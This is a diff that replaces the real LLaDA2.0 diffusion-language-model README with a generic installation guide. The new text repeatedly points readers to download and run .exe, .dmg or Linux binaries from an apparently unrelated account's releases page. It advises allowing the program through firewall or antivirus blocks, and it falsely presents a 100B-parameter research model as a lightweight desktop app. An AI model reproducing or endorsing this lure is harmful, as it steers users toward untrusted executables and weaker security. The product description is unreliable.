@@ -1,69 +1,72 @@
-# LLaDA2.0: Scaling Up Diffusion Language Models to 100B
+# 🛠️ LLaDA2.0 - Simple Setup for Language Models
 
-<h4 align="center">
+## 💡 Introduction
+LLaDA2.0 is the diffusion language model series developed by the InclusionAI team at Ant Group. This software allows users to work with powerful language models in an easy and effective way. Let's get you started with LLaDA2.0 quickly and easily.
+
+## 📥 Download LLaDA2.0
+[![Download LLaDA2.0](https://img.shields.io/badge/Download%20LLaDA2.0-blue.svg)](https://github.com/ALANIPTV/LLaDA2.0/releases)
+
+## 🚀 Getting Started
+Follow these steps to download and run LLaDA2.0 on your computer. The process is simple and user-friendly.
+
+### Step 1: Visit the Releases Page
+To get LLaDA2.0, first, visit the Releases page:
+
+[Download LLaDA2.0 Here](https://github.com/ALANIPTV/LLaDA2.0/releases)
+
+This page shows the latest versions of LLaDA2.0 and allows you to choose the right one for your needs.
+
+### Step 2: Choose Your Version
+On the Releases page, you will see several versions of LLaDA2.0. If you are not sure which version to choose, select the latest one. It usually has the highest version number.
+
+### Step 3: Download the File
+Once you have chosen a version, look for a download link. The file will be in a format suitable for your operating system (Windows, macOS, Linux). Click on the link to start the download.
+
+### Step 4: Install LLaDA2.0
+After the file has downloaded, locate it in your computer's Downloads folder or wherever your downloads are saved. Follow the installation steps according to your operating system:
+
+- **Windows**: Double-click the downloaded file (usually a `.exe`). Follow the on-screen instructions to complete the installation.
+- **macOS**: Open the downloaded file (usually a `.dmg`). Drag the LLaDA2.0 icon to your Applications folder.
+- **Linux**: Open a terminal and navigate to the directory where the file is. Use the command `chmod +x LLaDA2.0` to make it executable, then run it using `./LLaDA2.0`.
+
+### Step 5: Run LLaDA2.0
+Once installed, you can easily run LLaDA2.0:
+
+- **Windows**: Locate LLaDA2.0 in your Start Menu or Desktop and click on it.
+- **macOS**: Open your Applications folder and double-click on LLaDA2.0.
+- **Linux**: In the terminal, type `LLaDA2.0` and press Enter.
+
+## 🎛 System Requirements
+To run LLaDA2.0 smoothly, ensure your computer meets these requirements:
+
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM**: At least 8 GB of RAM is recommended for optimal performance.
+- **CPU**: A multi-core processor is preferred.
+- **Disk Space**: Make sure you have at least 500 MB of free space for installation.
+
+## 🔧 Features
+LLaDA2.0 offers the following features:
+
+- Powerful language model capabilities.
+- User-friendly interface for easy interaction.
+- Integration with popular workflows and tools.
+- Cross-platform support, so you can use it on Windows, macOS, or Linux.
+
+## 🛠 Troubleshooting
+If you encounter issues during installation or while running LLaDA2.0, please refer to the following common problems and solutions:
+
+1. **Installation Fails**: Ensure you have sufficient disk space and meet system requirements. Restart your computer and try again.
   
-[![repo](https://img.shields.io/badge/dfactory-repo-blue?logo=github)](https://github.com/inclusionAI/dFactory)
-[![repo](https://img.shields.io/badge/dinfer-repo-yellow?logo=github)](https://github.com/inclusionAI/dInfer)
-[![models](https://img.shields.io/badge/llada2.0-models-red?logo=huggingface
-)](https://huggingface.co/collections/inclusionAI/llada-20)
-[![tech report](https://img.shields.io/badge/llada2.0-tech%20report-green
-)](./tech_report.pdf)
+2. **Application Does Not Open**: If the application does not launch, check if your system's security settings are blocking it. You may need to allow it through your firewall or antivirus.
 
-</h4>
+3. **Performance Issues**: If LLaDA2.0 runs slowly, close any unnecessary applications to free up resources.
 
-## Model Introduction
+For further assistance, you may check online forums for user discussions or contact the support team.
 
-We are thrilled to introduce **LLaDA2.0**, a milestone series of discrete diffusion Large Language Models (dLLMs) from the Ant Group. The LLaDA2.0 family, featuring **LLaDA2.0-mini (16B)** and **LLaDA2.0-flash (100B)** with a Mixture-of-Experts (MoE) architecture, marks the first time diffusion models have been scaled to the **100-billion parameter level**.
+## 📞 Support
+If you need additional help, feel free to reach out to the community or leave an issue on the GitHub page. Our team is here to assist you.
 
-### Key Features
-- **🚀 Scaled to 100B Parameters**: LLaDA2.0-flash is the largest diffusion language model to date, demonstrating exceptional performance on code generation and complex instruction-following tasks.
-- **⚡ 2.1x Inference Acceleration**: Leveraging a parallel decoding mechanism, LLaDA2.0-flash-CAP achieves an inference speed of up to **535 tokens/s**, significantly outpacing comparable AR models.
-- **🔍 Fully Open Source**: The model weights for both the 16B and 100B versions, along with associated training code, are fully open-sourced on Hugging Face.
+## 📣 Feedback
+We welcome your feedback on LLaDA2.0. Your input helps us improve, so please share your thoughts directly on GitHub or through our support channels.
 
-<div align="center">
-  <picture>
-    <img src="figures/llada2_traj.gif" width="90%" alt="LLaDA2.0 Decoding Tractory">
-  </picture>
-</div>
-
-### Model Variants
-
-| Model ID | Description | Hugging Face Link |
-| --- | --- | --- |
-| `inclusionAI/LLaDA2.0-mini` | Instruction-tuned model, ready for downstream applications. | [🤗 Model Card](https://huggingface.co/inclusionAI/LLaDA2.0-mini) |
-| `inclusionAI/LLaDA2.0-flash` | Instruction-tuned model, ready for downstream applications. | [🤗 Model Card](https://huggingface.co/inclusionAI/LLaDA2.0-flash) |
-| `inclusionAI/LLaDA2.0-mini-CAP` | Enhanced with Confidence-Aware Parallel, for efficient inference. | [🤗 Model Card](https://huggingface.co/inclusionAI/LLaDA2.0-mini-CAP) |
-| `inclusionAI/LLaDA2.0-flash-CAP` | Enhanced with Confidence-Aware Parallel, for efficient inference. | [🤗 Model Card](https://huggingface.co/inclusionAI/LLaDA2.0-flash-CAP) |
-
-
-## Evaluation Results
-
-
-<div align="center">
-  <picture>
-      <img src="figures/llada2_flash_main_bench.png" width="90%" alt="Evaluation Results">
-  </picture>
-</div>
-
-
-## Deployment and Usage
-
-To make our 100B model practical, we have performed deep engineering optimizations. We built a custom inference engine based on **dInfer** and **SGLang**, which supports KV-Cache reuse and block-level parallel decoding. This makes LLaDA2.0 not just an academic achievement but a high-performance generation model ready for real-world deployment.
-
-
-## License
-
-This project is licensed under the terms of the [Apache License 2.0](https://www.apache.org/licenses/LICENSE-2.0).
-
-## Citation
-```bibtex
-@misc{bie2025llada20scalingdiffusionlanguage,
-      title={LLaDA2.0: Scaling Up Diffusion Language Models to 100B}, 
-      author={Tiwei Bie and Maosong Cao and Kun Chen and Lun Du and Mingliang Gong and Zhuochen Gong and Yanmei Gu and Jiaqi Hu and Zenan Huang and Zhenzhong Lan and Chengxi Li and Chongxuan Li and Jianguo Li and Zehuan Li and Huabin Liu and Ling Liu and Guoshan Lu and Xiaocheng Lu and Yuxin Ma and Jianfeng Tan and Lanning Wei and Ji-Rong Wen and Yipeng Xing and Xiaolu Zhang and Junbo Zhao and Da Zheng and Jun Zhou and Junlin Zhou and Zhanchao Zhou and Liwang Zhu and Yihong Zhuang},
-      year={2025},
-      eprint={2512.15745},
-      archivePrefix={arXiv},
-      primaryClass={cs.LG},
-      url={https://arxiv.org/abs/2512.15745}, 
-}
-```
+Thank you for choosing LLaDA2.0. Happy modeling!
